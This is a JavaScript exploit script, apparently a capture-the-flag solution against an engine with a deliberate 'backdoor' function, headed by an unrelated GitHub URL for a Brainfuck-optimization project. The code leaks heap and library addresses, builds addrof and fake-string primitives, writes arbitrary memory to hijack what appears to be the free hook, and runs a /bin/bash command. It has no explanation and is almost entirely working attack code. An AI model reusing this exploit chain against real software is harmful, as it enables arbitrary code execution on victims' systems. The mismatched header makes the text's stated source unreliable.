https://github.com/matslina/bfoptimization
JRS = function() {
    function f2(B, r) {
        for (var t = [], n = null; r--;) n = B % 2,
        t[r] = n,
        B -= n,
        B /= 2;
        return t.join("")
    }
    function HexFn(B) {
        return parseInt(B, 2).toString(16)
    }
    function func1(B) {
        return B.replace(/(\d{4})/g, HexFn)
    }
    function h2s(B) {
        for (var r = "",
        t = 0; t < B.length - 1; t += 2) r += f2(parseInt(B.substring(t, t + 2), 16), 8);
        return r
    }
    function SngFwd(B, r, t) {
        var n = {};
        return t = Math.pow(2, 23) * t + .5,
        n.a = 255 & t,
        n.b = 255 & t >> 8,
        n.c = 127 & t >> 16 | (1 & r) << 7,
        n.d = B << 7 | r >> 1,
        n
    }
    function DblFwd(B, r, t) {
        var n = {};
        return t = Math.pow(2, 52) * t,
        n.a = 65535 & t,
        n.b = 65535 & t >> 16,
        t /= Math.pow(2, 32),
        n.c = 65535 & t,
        n.d = B << 15 | r << 4 | 15 & t >> 16,
        n
    }
    function CVTFWD(B, r) {
        var t = null,
        n = null,
        a = null,
        e = null,
        o = "",
        i = {
            32 : {
                d: 127,
                c: 128,
                b: 0,
                a: 0
            },
            64 : {
                d: 32752,
                c: 0,
                b: 0,
                a: 0
            }
        },
        s = {
            32 : 8,
            64 : 11
        } [B],
        u = B - s - 1;
        if (isNaN(r) && ((e = i[B]).a = 1, t = !1, n = Math.pow(2, s) - 1, a = Math.pow(2, -u)), e || (t = r < 0 || 1 / r < 0, isFinite(r) || (e = i[B], t && (e.d += 1 << B / 4 - 1), n = Math.pow(2, s) - 1, a = 0)), !e) {
            for (n = {
                32 : 127,
                64 : 1023
            } [B], a = Math.abs(r); a >= 2;) n++,
            a /= 2;
            for (; a < 1 && n > 0;) n--,
            a *= 2;
            n <= 0 && (a /= 2, o = "Z"),
            32 == B && n > 254 && (o = "Too big for Single", e = {
                d: t ? 255 : 127,
                c: 128,
                b: 0,
                a: 0
            },
            n = Math.pow(2, s) - 1, a = 0)
        }
        return e || (e = {
            32 : SngFwd,
            64 : DblFwd
        } [B](t, n, a)),
        e.sgn = +t,
        e.exp = f2(n, s),
        a = a % 1 * Math.pow(2, u),
        32 == B && (a = Math.floor(a + .5)),
        e.mnt = f2(a, u),
        e.nb01 = o,
        e
    }
    function CVTREV(B) {
        var r = {
            32 : 8,
            64 : 11
        } [B.length],
        t = B.match(new RegExp("^(.)(.{" + r + "})(.*)$")),
        n = "1" == t[1] ? -1 : 1;
        if (!/0/.test(t[2])) {
            var a = /1/.test(t[3]) ? NaN: n / 0;
            quit(1)
        }
        var e = 0 == +t[2],
        o = parseInt(t[2], 2) - Math.pow(2, r - 1) + 1;
        return n * (parseInt(t[3], 2) / Math.pow(2, t[3].length) + !e) * Math.pow(2, o + e)
    }
    this.f2 = function(d, size) {
        var NumW = size,
        Qty = d;
        with(CVTFWD(NumW, Qty)) return func1(sgn + exp + mnt)
    },
    this.h2t = function(B, r) {
        var t = r,
        n = h2s(B);
        if (new RegExp("^[01]{" + t + "}$").test(n)) return CVTREV(n);
    }
},
jrs = new JRS,
gc(),
str2 = 'BBBBBBBBBBBBBBBB',
obj = {};
for (var i = 0; i < 1024; i++) obj["a" + i] = "A";
offset1 = 1269,
backdoor(str2, offset1);
for (var leak = void 0,i = 0; i < 1024; i++)
"A" != obj["a" + i] && (leak = obj["a" + i], obj["a" + i] = "A");
null == leak && (quit(1));
var heap_ptr = parseInt(jrs.f2(leak, 64), 16);
function addrof(B) {
    for (var r = 0; r < 1024; r++) obj["a" + r] = B;
    for (backdoor(str2, offset1), r = 0; r < 1024; r++) if (obj["a" + r] != B) return parseInt(jrs.f2(obj["a" + r], 64), 16);
    return null
}
function fakestr(B) {
    for (var r = jrs.h2t("0000" + B.toString(16), 64), t = 0; t < 1024; t++) obj["a" + t] = r;
    backdoor(str2, 1461);
    var n = void 0;
    for (t = 0; t < 1024; t++) if (obj["a" + t] != r) return n = obj["a" + t],
    obj["a" + t] = B,
    n;
    return null
}
write("heap_ptr\n");
var start = heap_ptr - 8212;
function look_for(B, r) {
    var t = null;
    for (t = start + r; t < start + 73728; t += 16) if (fakestr(t).substring(0, B.length) == B) return t;
    return null
}
function read_hex(B) {
    for (var r = encodeURI(fakestr(B)), t = "", n = 0; n < r.length;)"%" != r[n] ? (t += r[n].charCodeAt(t).toString(16), n += 1) : (t += r.substring(n + 1, n + 3), n += 3);
    return t
}
function leak_ptr(B) {
    for (var r = read_hex(B), t = "", n = r.length - 2; n >= 0; n -= 2) t += r.substring(n, n + 2);
    return parseInt(t, 16)
}
for (ptr = leak_ptr(heap_ptr - 20);
"1d0" != ptr.toString(16).substring(9, 12);) ptr = leak_ptr(ptr + 8);
cb = ptr - 2298320,
lb = leak_ptr(cb + 2297808) - 137904,
write("lb @ 0x" + lb.toString(16) + "\n"),
fh = lb + 4118760,
st = lb + 324832,
lock_addr = lb + 4114408,
gc(),
str10 = str2 + str2,
str20 = str10 + str10,
h = {};
for (var i = 0; i < 2e3; i++) h["a" + i] = str20.substring(0, 32);
gc();
h2 = {};
for (var i = 0; i < 1e3; i++) h2["a" + i] = str20.substring(0, 16),
h2["aa" + i] = str20.substring(0, 4);
function wb(r, e) {
    var t = 512 + (255 & e),
    a = fakestr(r - 2 * t);
    backdoor(a, t)
}
function wp(r, e) {
    var t = "0000" + e.toString(16);
    lo = parseInt(t.substring(8, 16), 16),
    hi = parseInt(t.substring(0, 8), 16);
    for (var a = 0; a < 4; a++) {
        var i = 255 & lo;
        lo >>= 8,
        wb(r + a, i)
    }
    for (a = 0; a < 4; a++) {
        i = 255 & hi;
        hi >>= 8,
        wb(r + 4 + a, i)
    }
}
target = str2,
c = target.substring(0, 1024),
d = c.substring(0, 1024),
e = d.substring(0, 32),
c = null,
delete c,
d = null,
delete d,
e = null,
delete e,
gc(),
hax = Array(1),
hax[0] = 3.83698281517203e117,
hax_addr = addrof(hax),
write("hax @ 0x" + hax_addr.toString(16) + "\n"),
elem_addr = leak_ptr(hax_addr + 8),
ea = leak_ptr(elem_addr),
target = fh - 32,

wb(lock_addr - 1, 0),
wb(hax_addr + 47, 4),
wp(target, ea),
wp(hax_addr + 8, target),
wb(hax_addr + 107, 4),
gc(),
hax[0] = jrs.h2t("0000" + st.toString(16), 64),
hax[0] = jrs.h2t("0;/bin/bash -c 'echo success > output';" + 79..toString(16), 64);
